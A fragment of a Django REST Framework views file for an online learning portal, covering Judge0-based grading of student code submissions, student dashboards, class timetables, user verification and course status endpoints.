    authentication_classes = (TokenAuthentication,)
    permission_classes = (IsAuthenticated,)

    def get(self, request):
        try:
            main_data = []
            pre_attmpt = []
            is_green = False
            user_id = request.user.id
            std_id = [i["id"] for i in Student.objects.filter(user_id=user_id).values("id")]
            if len(std_id) > 0:
                std_id = std_id[0]
            else:
                std_id = ""
            api_result = []
            main_data_id = request.GET.get("main_data_id")
            check_ans = CompilerQuestionAtempt.objects.filter(id=main_data_id)
            if check_ans.exists():
                get_ans = check_ans.first()
                student_id = get_ans.student.id
                ques_id = get_ans.question.id
                ques_name = get_ans.question.ques_title
                prob_id = get_ans.question.prob_id
                source_code = get_ans.student_ans
                compiler = get_ans.load_template.compiler.split("||")
              
                triple_quoted_string = '''{}'''.format(source_code)
                compiler_id = compiler[1]
                
                
                if isinstance(get_ans.question.test_cases_to_pass, str):
                    test_cases = json.loads(get_ans.question.test_cases_to_pass)['data']
                else:
                    test_cases = get_ans.question.test_cases_to_pass['data']

                url = 'https://judge0-ce.p.rapidapi.com/submissions/batch'
                headers = {
                    'Content-Type': 'application/json',
                    'x-rapidapi-host': "judge0-ce.p.rapidapi.com",
                    'x-rapidapi-key': RAPID_API_KEY  # Replace with your RapidAPI key
                }

                submissions = []

                def format_stdin(inputs, output):
                    stdin = None
                    expected_output = None
                    for i in inputs:
                        if not stdin:
                            stdin = str(i["value"])
                        else:
                            stdin = stdin + f" {i["value"]}"
                    for j in output:
                        if not expected_output:
                            expected_output = f"{j["value"]}\n"
                        
                    return stdin, expected_output
                
                for test_case in test_cases:
                    inputs = test_case["input"]
                    
                    # num_tests = len(inputs) // len(inputs)  # Assuming each test case has two numbers
                    # stdin = f"{num_tests}\n" + "\n".join([str(input['value']) for input in inputs])
                    stdin, expected_output = format_stdin(inputs, test_case["expected"])
                    # expected_output = "\n".join([str(exp['value']) for exp in test_case["expected"]]) + "\n"
                    print(stdin)
                    print(expected_output)
                    
                    submissions.append({
                        "language_id": compiler_id,
                        "source_code": triple_quoted_string,
                        "stdin": stdin,
                        "expected_output": expected_output,
                        "time_limit": 5,
                        "memory_limit": 128000
                    })

                payload_for_post = {
                    "submissions": submissions
                }

                response = requests.post(url, headers=headers, json=payload_for_post)
                
                if response.status_code == 201:
                    data = response.json()
                    get_ans.code_response = data

                    if isinstance(data, dict) and 'submissions' in data:
                        batch_tokens = ','.join([sub['token'] for sub in data['submissions']])
                    elif isinstance(data, list):
                        batch_tokens = ','.join([sub['token'] for sub in data])
                    else:
                        raise ValueError("Unexpected data structure in API response")

                    time.sleep(3)
                    batch_result = get_batch_result(batch_tokens)
                    print(batch_result)
                    for i, result in enumerate(batch_result['submissions']):   
                        test_case = test_cases[i]
                        res_da = {
                            "number": i,
                            "status": {
                                "code": result['status']['id'],
                                "name": result['status']['description']
                            },
                            "score": 0,
                            "time": result.get('time', 0),
                            "memory": result.get('memory', 0),
                            "signal": 0,
                            "signal_desc": ""
                        }
                        api_result.append(res_da)

                    passed_tests = sum(1 for res in api_result if res['status']['code'] == 3)  # Assuming 'accepted' has status code 3
                    total_tests = len(api_result)
                
                    main_data_item = {
                        'id': get_ans.id,
                        'executing': False,
                        'date': datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S +00:00'),
                        'compiler': {
                            'id': compiler_id,
                            'name': compiler,
                            'version': {
                                'id': None,
                                'name': None
                            }
                        },
                        'problem': {
                            'id': ques_id,
                            'code': prob_id,
                            'name': ques_name,
                            'uri': ''
                        },
                        'result': {
                            'score': (passed_tests / total_tests) * 100,
                            'status': {
                                'code': 15 if passed_tests == total_tests else 11,
                                'name': 'Accepted' if passed_tests == total_tests else 'Wrong Answer'
                                # 'name': next((r['status']['description'] for r in batch_result["submissions"] if r['status']['description']), None)
                            },
                            'time': sum([float(r.get('time', 0)) if r.get('time') is not None else 0 for r in batch_result["submissions"]]),
                            'memory': max([int(r.get('memory', 0)) if r.get('memory') is not None else 0 for r in batch_result["submissions"]] or [0]),
                            'signal': 0,
                            'signal_desc': '',
                            'testcases': api_result
                        },
                        'uri': ''
                    }
                    main_data.append(main_data_item)

                    get_ans.code_response = json.dumps({"items": main_data})
                    get_ans.submissions_id = None
                    result_data = []
                    error_data = None
                    for r in batch_result["submissions"]:
                        if r.get("stdout") is not None:
                            data = r.get("stdout").strip()
                            result_data.append(data)
                        elif r.get("stderr") is not None:
                            error_data = r.get("stderr").strip()
                            break
                        elif r.get("compile_output") is not None:
                            error_data = r.get("compile_output").strip()
                            break
                    get_ans.code_response_status = {"status":main_data[0]['result']['status']["name"], "data":result_data if len(result_data) > 0 else error_data }
                    get_ans.status = True if main_data[0]['result']['status']['code'] == 15 else False
                    get_ans.save()

                    previous_attempts = CompilerQuestionAtempt.objects.filter(
                        question_id=ques_id,
                        student_id=student_id,
                        question__practice_mock=True,
                        submited=False,
                        button_clicked="Submit"
                    ).order_by("-id").values(
                        "id", "status", "load_template__compiler", "student_ans", "practic_time", "code_response", "code_response_status"
                    )
                    
                    for ti in previous_attempts:
                        if ti["code_response"] is not None:
                            res = json.loads(ti["code_response"])
                            ti["timer"] = res['items'][0]['result']["time"]
                            ti["memory"] = res['items'][0]['result']["memory"]
                            ti.update(ti["code_response_status"])
                            del ti["code_response"]
                            del ti["code_response_status"]
                    pre_attmpt = previous_attempts if previous_attempts else []
                    result_list = []
                    for st in pre_attmpt:
                        result_list.append(st.get("status"))
                    result_list.append(get_ans.code_response_status.get("status"))
                    if "Accepted" in result_list:
                        is_green = True
                    return Response({
                        "main_data": {
                            "items": main_data
                        },
                        "is_green" : is_green,
                        "source_code": source_code,
                        "previous_attempts": pre_attmpt,
                        "api_result": get_ans.code_response_status
                    })
            else:
                return Response({"error": "Invalid main_data_id"})
        except Exception as e:
            return Response({"error": f"{e}"})


class StudentDashboardAllProgressBar(ListAPIView): #updated code 
    authentication_classes = (TokenAuthentication,)
    permission_classes = (IsAuthenticated,)
    def get(self, request):
        try :
            user_id = request.user.id
            stud_quiz_progress = quiz_progress_bar(user_id) 
            stud_mock_progress = mock_progress_bar(user_id) 
            stud_attend_progress = student_attend_progress_bar(user_id)
            return Response({"main_data1":stud_quiz_progress,"main_data2":stud_mock_progress,"main_data3":stud_attend_progress})
        except Exception as e :
            return Response({"error":f"{e}"}) 

class StudentDashboardOngoingUpcomingUpdates(ListAPIView):
    authentication_classes = (TokenAuthentication,)
    permission_classes = (IsAuthenticated,)        

    def get(self, request): 
        try:
            user_id = request.user.id
            std_id = [i["id"] for i in Student.objects.filter(user_id=user_id).values("id")]
            get_batch = BatchJoined.objects.filter(student_id__in=std_id).values("batch_id", "batch__course_id")
            # course_ids = [i["batch__course_id"] for i in get_batch]
            batch_ids = [i["batch_id"] for i in get_batch]
            all_timetable = []
            # print(batch_ids)
            # now = datetime.now()
            for i in batch_ids:
                timetable = list(TimeTable.objects.filter(batch_id=i).values("id", "start_date", "start_time", "end_time", "link", "week", "batch_id", "day"))
                all_timetable += timetable
            sorted_all_timetable = sorted(all_timetable, key=lambda x: (x['start_date'], x['start_time']))
            # print(sorted_all_timetable)
            current_datetime = datetime.now()
            past_classes = [c for c in sorted_all_timetable if c['end_time'] and datetime.combine(c['start_date'], c['end_time']) < current_datetime]
            future_classes = [c for c in sorted_all_timetable if c['end_time'] and datetime.combine(c['start_date'], c['end_time']) >= current_datetime]
            for post_class in past_classes:
                post_class["course"] = Batch.objects.filter(id=post_class["batch_id"]).values("course__name")[0]["course__name"]
                post_class["time_table_topic"] = TimeTable.objects.filter(week=post_class["week"], day=post_class["day"], batch_id = post_class["batch_id"]).values("topic")[0]["topic"]
                week_id = list(Week.objects.filter(week=post_class["week"], course_id=int(Batch.objects.filter(id=post_class["batch_id"]).values("course_id")[0]["course_id"])).values("id"))
                print(week_id)
                today_topic_list = Topic.objects.filter(week_id=int(week_id[0]["id"]), day=post_class["day"]).values("name")
                if len(today_topic_list) == 0:
                    post_class["today_topic"] = ""
                else:
                    post_class["today_topic"] = today_topic_list[0]["name"]
            ongoing_data = []
            upcoming_data = []
            all_upcoming_data = []
            if len(future_classes) == 1:
                data = future_classes[0]
                data["course"] = Batch.objects.filter(id=data["batch_id"]).values("course__name")[0]["course__name"]
                data["time_table_topic"] = TimeTable.objects.filter(week=data["week"], day=data["day"], batch_id = data["batch_id"]).values("topic")[0]["topic"]
                week_id = list(Week.objects.filter(week=data["week"], course_id=int(Batch.objects.filter(id=data["batch_id"]).values("course_id")[0]["course_id"])).values("id"))
                today_topic_list = Topic.objects.filter(week_id=int(week_id[0]["id"]), day=data["day"]).values("name")
                if len(today_topic_list) == 0:
                    data["today_topic"] = ""
                else:
                    data["today_topic"] = today_topic_list[0]["name"]
                ongoing_data.append(data)
                data = {"message": "No Upcoming Class"}
                upcoming_data.append(data)
            elif len(future_classes) > 1:
                data = future_classes[0]
                data["course"] = Batch.objects.filter(id=data["batch_id"]).values("course__name")[0]["course__name"]
                data["time_table_topic"] = TimeTable.objects.filter(week=data["week"], day=data["day"], batch_id = data["batch_id"]).values("topic")[0]["topic"]
                week_id = list(Week.objects.filter(week=data["week"], course_id=int(Batch.objects.filter(id=data["batch_id"]).values("course_id")[0]["course_id"])).values("id"))
                today_topic_list = Topic.objects.filter(week_id=int(week_id[0]["id"]), day=data["day"]).values("name")
                if len(today_topic_list) == 0:
                    data["today_topic"] = ""
                else:
                    data["today_topic"] = today_topic_list[0]["name"]
                ongoing_data.append(data)
                data = future_classes[1]
                data["course"] = Batch.objects.filter(id=data["batch_id"]).values("course__name")[0]["course__name"]
                data["time_table_topic"] = TimeTable.objects.filter(week=data["week"], day=data["day"], batch_id = data["batch_id"]).values("topic")[0]["topic"]
                week_id = list(Week.objects.filter(week=data["week"], course_id=int(Batch.objects.filter(id=data["batch_id"]).values("course_id")[0]["course_id"])).values("id"))
                today_topic_list = Topic.objects.filter(week_id=int(week_id[0]["id"]), day=data["day"]).values("name")
                if len(today_topic_list) == 0:
                    data["today_topic"] = ""
                else:
                    data["today_topic"] = today_topic_list[0]["name"]
                upcoming_data.append(data)
            else:
                pass
            for data in future_classes:  # add for list of all all upcoming data
                data["course"] = Batch.objects.filter(id=data["batch_id"]).values("course__name")[0]["course__name"]
                data["time_table_topic"] = TimeTable.objects.filter(week=data["week"], day=data["day"], batch_id=data["batch_id"]).values("topic")[0]["topic"]
                week_id = list(Week.objects.filter(week=data["week"], course_id=int(Batch.objects.filter(id=data["batch_id"]).values("course_id")[0]["course_id"])).values("id"))
                today_topic_list = Topic.objects.filter(week_id=int(week_id[0]["id"]), day=data["day"]).values("name")
                if len(today_topic_list) == 0:
                    data["today_topic"] = ""
                else:
                    data["today_topic"] = today_topic_list[0]["name"]
                all_upcoming_data.append(data)  
            data = {"ongoing": ongoing_data, "upcoming": upcoming_data, "all_upcoming_data": all_upcoming_data, "recent_passed": past_classes[::-1]}
            return Response({"response_data": data}, status=status.HTTP_200_OK)
        except Exception as e :
            return Response({"error":f"{e}"})
           
class StudentDashboardAllContests(ListAPIView): 
    authentication_classes = (TokenAuthentication,)
    permission_classes = (IsAuthenticated,)
    def get(self, request):
        try :
            user_id = request.user.id
            stud_quiz_contest = quiz_contest(user_id) 
            stud_mock_contest = mock_contest(user_id) 
            stud_practice_contest= practice_contest(user_id)
            return Response({"main_data1":stud_quiz_contest,"main_data2":stud_mock_contest,"main_data3":stud_practice_contest})
        except Exception as e :
            return Response({"error":f"{e}"}) 
    

# class UserVarificationView(ListAPIView):
#     authentication_classes = [TokenAuthentication,]
#     permission_classes = (IsAuthenticated,)
    
#     def get(self, request):
#         user_id = request.user.id 
#         std_obj = Student.objects.filter(user_id=user_id)
#         inst_obj = Instructor.objects.filter(user_id=user_id)
#         if std_obj.exists(): 
#             std_id = std_obj.first().id
#             get_batch = BatchJoined.objects.filter(student_id=std_id).values("batch_id", "batch__course_id", "batch__start_date")
#             batch_ids = [i["batch_id"] for i in get_batch]
#             course_ids = [i["batch__course_id"] for i in get_batch]
#             all_times = TimeTable.objects.filter(
#                 batch__course_id__in=course_ids,
#                 batch_id__in=batch_ids 
#             ).order_by("start_date")
#             name = std_obj.first().user.first_name
#             free_course = FreeCourseJoinee.objects.filter(student_id=std_id)
#             if free_course.exists:
#                 free_course_status = True
#             else:
#                 free_course_status = False
#             if len(all_times) == 0:
#                 response_data = {
#                     "name": name,
#                     "role": "Student",
#                     "end_date": "",
#                     "start_date": "",
#                     "login_status": False,
#                     "free_course": free_course_status,
#                     "message": "You have No Batch"
#                 }
#                 return Response(response_data, status=status.HTTP_200_OK)
#             else:
#                 start_date = all_times.first()
#                 end_date = all_times.last()
#                 last_date = end_date.start_date
#                 first_data = start_date.start_date
#                 end__date = last_date + timedelta(days=30)
#                 current_date = datetime.now().date()

#                 if first_data <= current_date <= end__date:
#                     login_status = True
#                     message = ""
#                 else:
#                     login_status = False
#                     message = "Your Course is Over"
            
#                 response_data = {
#                     "name": name,
#                     "role": "Student",
#                     "end_date": end__date,
#                     "start_date": first_data,
#                     "login_status": login_status,
#                     "free_course": free_course_status,
#                     "message": message
#                 }
#                 return Response(response_data, status=status.HTTP_200_OK)
#         elif inst_obj.exists():
          
#             name = inst_obj.first().user.first_name
#             ress = {
#                 "name": name,
#                 "role": "Instructor",
#                 "end_date": "",
#                 "start_date": "",
#                 "login_status": True,
#                 "free_course": False,
#                 "message": "Done"
#             }
#             return Response(ress, status=status.HTTP_200_OK)
#         else:
#             ress = {
#                 "name": None,
#                 "role": "others",
#                 "end_date": "",
#                 "start_date": "",
#                 "login_status": False,
#                 "free_course": False,
#                 "message": "You are not Mentor / Student"
#             }
#             return Response(ress, status=status.HTTP_200_OK)


        

class UserVarificationView(ListAPIView):
    authentication_classes = [TokenAuthentication,]
    permission_classes = (IsAuthenticated,)
    
    def get(self, request):
        user_id = request.user.id 
        std_obj = Student.objects.filter(user_id=user_id)
        inst_obj = Instructor.objects.filter(user_id=user_id)
        if std_obj.exists(): 
            std_id = std_obj.first().id
            current_date = datetime.now().date()
            get_batch = BatchJoined.objects.filter(student_id=std_id).filter(Q(batch__revoke_date__gte=current_date) | Q(batch__revoke_date__isnull=True))
            print(get_batch)     
            name = std_obj.first().user.first_name
            free_course = FreeCourseJoinee.objects.filter(student_id=std_id)
            if free_course.exists():
                free_course_status = True
                free_message = ""
            else:
                free_course_status = False
                free_message = "Enroll in a free course to access the portal."
            if not get_batch.exists():
                response_data = {
                    "name": name,
                    "role": "Student",
                    "end_date": "",
                    "start_date": "",
                    "login_status": False,
                    "free_course": free_course_status,
                    "paid_course": False,
                    "message": "Enroll in a premium course to access the portal.",
                    "free_message": free_message
                }
                return Response(response_data, status=status.HTTP_200_OK)
            else:
                start_date = get_batch.first().batch.start_date
                end_date = get_batch.last().batch.revoke_date if get_batch.last().batch.revoke_date else ""  

                if  end_date in ["", " ", None, "null"]:
                    login_status = True
                    message = ""
                elif start_date <= current_date <= end_date:
                    login_status = True
                    message = ""
                else:
                    login_status = False
                    message = "Your Course is Over"
            
                response_data = {
                    "name": name,
                    "role": "Student",
                    "end_date": end_date,
                    "start_date": start_date,
                    "login_status": login_status,
                    "paid_course":True,
                    "free_course": free_course_status,
                    "message": message,
                    "free_message":free_message
                }
                return Response(response_data, status=status.HTTP_200_OK)
        elif inst_obj.exists():
          
            name = inst_obj.first().user.first_name
            ress = {
                "name": name,
                "role": "Instructor",
                "end_date": "",
                "start_date": "",
                "login_status": True,
                "free_course": False,
                "paid_course":False,
                "message": "Done",
                "free_message":""
            }
            return Response(ress, status=status.HTTP_200_OK)
        else:
            ress = {
                "name": None,
                "role": "others",
                "end_date": "",
                "start_date": "",
                "login_status": False,
                "free_course": False,
                "paid_course":False,
                "message": "You are not Mentor / Student",
                "free_message":""
            }
            return Response(ress, status=status.HTTP_200_OK)



#21.01.2024 -> Quiz Top Menu bar

class StudentCourseSelectionTabForQuiz(ListAPIView):
    authentication_classes = [TokenAuthentication,]
    permission_classes = (IsAuthenticated,)
    def get(self, request):
        try:
            user_id = request.user.id
            std_id = [i["id"] for i in Student.objects.filter(user_id=user_id).values("id")]  
            data =[]
            course_batches_details = Batch.objects.filter(students__id__in = std_id,completed = False).values("id" ,"course_id" ,"course__name" ,"revoke_date")
            if course_batches_details.exists():
                for i in course_batches_details:
                        batch_info = {
                            'batch_id':i["id"],
                            'course_id': i["course_id"],
                            'course__name': i["course__name"], 
                        }
                        data.append(batch_info)
                return Response({"message":1,"course_batches_details":data}, status=status.HTTP_200_OK)
            else:
                data =[]
                return Response({"message":0,"course_batches_details":data}, status=status.HTTP_400_BAD_REQUEST)   
        except Exception as e :
            return Response({"error":f"{e}"})

# 21/04/2024 -. revoke student from course
class StudentRevokeFromCompleteCourse(ListAPIView):
    authentication_classes = [TokenAuthentication]
    permission_classes = [IsAuthenticated]

    def get(self, request):
        try:
            user_id = request.user.id
            std_id = [i["id"] for i in Student.objects.filter(user_id=user_id).values("id")]

            course_batches_details = Batch.objects.filter(
                students__id__in=std_id, completed=False
            ).values("id", "course_id", "course__name", "revoke_date", "completed")

            current_datetime = datetime.now()
            formatted_datetime = current_datetime.strftime("%Y-%m-%d-%H:%M:%S")
            courses_info = []

            if course_batches_details.exists():
                for i in course_batches_details:
                    if i['revoke_date'] is None:
                        if i['completed']:
                            course_status = "Batch is Completed"
                        else:
                            course_status = "Batch is not Not Completed"
                    else:
                        course_status = "Batch is Completed" if str(i['revoke_date']) < formatted_datetime else "Not Completed"
                    course_info = {
                        "course_id": i["course_id"],
                        "course_name": i["course__name"],
                        "batch_id": i["id"],
                        "course_status": course_status
                    }
                    courses_info.append(course_info)

                return Response(
                    {
                        "courses": courses_info},status=status.HTTP_200_OK)
            else:
                return Response(
                    {
                        "message": "No ongoing courses found.",
                        "batch_id": None
                    },status=status.HTTP_400_BAD_REQUEST)

        except ValidationError as ve:
            return Response(
                {"error": str(ve)},status=status.HTTP_400_BAD_REQUEST)
        except Exception as e:
            return Response(
                {"error": f"An error occurred: {str(e)}"},status=status.HTTP_500_INTERNAL_SERVER_ERROR)






